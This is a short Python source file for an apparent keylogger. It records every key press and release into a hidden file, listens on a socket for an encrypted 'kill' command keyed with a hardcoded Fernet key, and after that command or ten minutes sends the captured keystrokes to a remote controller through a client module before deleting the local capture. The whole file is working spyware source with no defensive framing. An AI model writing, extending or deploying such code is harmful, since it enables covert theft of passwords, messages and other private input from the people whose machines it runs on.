import time
import os  
import client
import signal
from threading import Thread
from pynput.keyboard import Listener, Controller
from cryptography.fernet import Fernet


def on_press(key):
    keyFormat = "key_press:{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def on_release(key):
    keyFormat = "key_release{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def receive_message(mysocket,listener):
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
    cipher_suite = Fernet(key)
    while True:
        data = mysocket.recv(1024)
        decrypted_data = cipher_suite.decrypt(data).decode("utf-8")
        if decrypted_data == "kill":
            listener.stop()
            client.send_file_securely(mysocket)
            client.stop_and_delete_capture_file()
        
def func_handle_time(period,listener,mysocket):
    time.sleep(period)
    listener.stop()
    client.send_file_securely(mysocket)
    client.stop_and_delete_capture_file()

def listen_keyboard(mysocket):

    with Listener(on_press=on_press, on_release=on_release) as listener:
        Thread(target=receive_message,args=(mysocket,listener)).start()
        Thread(target=func_handle_time,args=(600.0,listener,mysocket)).start()
        listener.join()
